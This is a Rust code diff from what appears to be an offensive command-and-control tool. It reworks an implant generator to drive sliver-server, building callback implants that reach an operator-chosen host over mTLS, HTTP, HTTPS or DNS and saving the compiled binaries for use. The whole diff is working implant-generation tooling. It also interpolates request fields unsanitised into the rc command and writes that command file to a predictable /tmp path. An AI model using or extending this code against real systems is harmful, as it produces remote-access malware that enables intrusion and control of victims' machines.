@@ -79,45 +79,63 @@ pub struct GenerateResponse {
     pub output_path: Option<String>,
 }
 
-/// Generate an implant by calling gen-payload.sh (uses sliver-client + expect).
-/// Does NOT need a SliverConnection — spawns sliver-client as child process.
+/// Generate an implant via sliver-server --rc (actually compiles, just slow first time).
+/// Does NOT need a SliverConnection — spawns sliver-server as child process.
 pub async fn generate_implant(
     req: GeneratePayloadRequest,
 ) -> GenerateResponse {
+    let proto = match req.protocol.as_str() {
+        "mtls" => format!("--mtls {}:{}", req.lhost, req.lport),
+        "http" => format!("--http {}:{}", req.lhost, req.lport),
+        "https" => format!("--https {}:{}", req.lhost, req.lport),
+        "dns" => format!("--dns {}:{}", req.lhost, req.lport),
+        _ => format!("--mtls {}:{}", req.lhost, req.lport),
+    };
+    let beacon = if req.is_beacon { " --beacon" } else { "" };
+
     let save_dir = std::env::current_dir().unwrap_or_default().join("payloads");
+    let save_str = save_dir.to_string_lossy().to_string();
     std::fs::create_dir_all(&save_dir).ok();
-    let beacon_str = if req.is_beacon { "true".to_string() } else { "false".to_string() };
-    let port_str = req.lport.to_string();
 
-    // Build the gen-payload.sh command
-    let script_path = std::env::var("GEN_PAYLOAD_SCRIPT")
-        .unwrap_or_else(|_| "/opt/naughtywolf/gen-payload.sh".to_string());
+    // RC command WITHOUT exit — server stays alive until compile finishes
+    let rc_cmd = format!(
+        "generate --name {} --os {} --arch {} --format {} {} {} --save {}\n",
+        req.name, req.goos, req.goarch, req.format, proto, beacon, save_str
+    );
 
-    let mut child = match tokio::process::Command::new(&script_path)
-        .args([
-            &req.name, &req.goos, &req.goarch, &req.format,
-            &req.protocol, &req.lhost, &port_str,
-            &beacon_str,
-        ])
+    let bin_raw = std::env::var("SLIVER_SERVER_PATH")
+        .unwrap_or_else(|_| "sliver-server".to_string());
+    let parts: Vec<&str> = bin_raw.split_whitespace().collect();
+    let (bin_cmd, bin_args) = parts.split_first().unwrap_or((&"sliver-server", &[]));
+
+    let rc_path = format!("/tmp/nw_rc_{}.txt", std::process::id());
+    let _ = std::fs::write(&rc_path, &rc_cmd);
+
+    let mut child = match tokio::process::Command::new(bin_cmd)
+        .args(bin_args)
+        .args(["--rc", &rc_path])
         .stdout(std::process::Stdio::piped())
         .stderr(std::process::Stdio::piped())
         .spawn()
     {
-        Ok(c) => c,
+        Ok(c) => { let _ = std::fs::remove_file(&rc_path); c }
         Err(e) => {
-            let msg = format!("Failed to run {script_path}: {e}. Ensure gen-payload.sh exists (set GEN_PAYLOAD_SCRIPT)");
-            tracing::error!("{msg}");
-            return GenerateResponse { success: false, message: msg, implant_name: None, output_path: None };
+            let _ = std::fs::remove_file(&rc_path);
+            return GenerateResponse {
+                success: false,
+                message: format!("Failed to start sliver-server: {e}. Set SLIVER_SERVER_PATH"),
+                implant_name: None, output_path: None,
+            };
         }
     };
 
-    // Wait with timeout (10 min for compilation)
+    // Wait up to 10 min (first Go compile may be slow)
     match tokio::time::timeout(std::time::Duration::from_secs(600), child.wait_with_output()).await {
         Ok(Ok(output)) => {
-            let stdout = String::from_utf8_lossy(&output.stdout);
-            if output.status.success() && stdout.contains("GEN_DONE") {
-                // Poll for the binary for up to 60s
-                let dl = poll_for_binary(&req.name, &save_dir, 60);
+            if output.status.success() {
+                tracing::info!("sliver-server generate completed successfully");
+                // Poll for binary in save dir (up to 60s)
+                let dl = poll_save_dir(&req.name, &save_dir);
                 GenerateResponse {
                     success: true,
                     message: format!("Payload '{}' generated", req.name),
@@ -126,9 +144,11 @@ pub async fn generate_implant(
                 }
             } else {
                 let stderr = String::from_utf8_lossy(&output.stderr);
+                let stdout = String::from_utf8_lossy(&output.stdout);
+                let combined = format!("{}{}", &stdout[..100.min(stdout.len())], &stderr[..200.min(stderr.len())]);
                 GenerateResponse {
                     success: false,
-                    message: format!("gen-payload.sh failed: {}", stderr.lines().next().unwrap_or("unknown")),
+                    message: format!("sliver-server failed: {}", combined),
                     implant_name: None, output_path: None,
                 }
             }
@@ -144,14 +164,14 @@ pub async fn generate_implant(
     }
 }
 
-/// Poll the save directory for the generated binary for up to `timeout_secs` seconds.
-fn poll_for_binary(name: &str, dir: &std::path::Path, timeout_secs: u64) -> Option<String> {
+/// Scan save directory for binary with matching name (up to 60s).
+fn poll_save_dir(name: &str, dir: &std::path::Path) -> Option<String> {
     let start = std::time::Instant::now();
-    while start.elapsed().as_secs() < timeout_secs {
+    while start.elapsed().as_secs() < 60 {
         if let Ok(entries) = std::fs::read_dir(dir) {
             for e in entries.flatten() {
                 let fname = e.file_name().to_string_lossy().to_string();
-                if (fname.contains(name) || fname.starts_with(name))
+                if (fname.contains(name) || fname == name)
                     && e.metadata().map(|m| m.is_file() && m.len() > 0).unwrap_or(false)
                 {
                     return Some(fname);
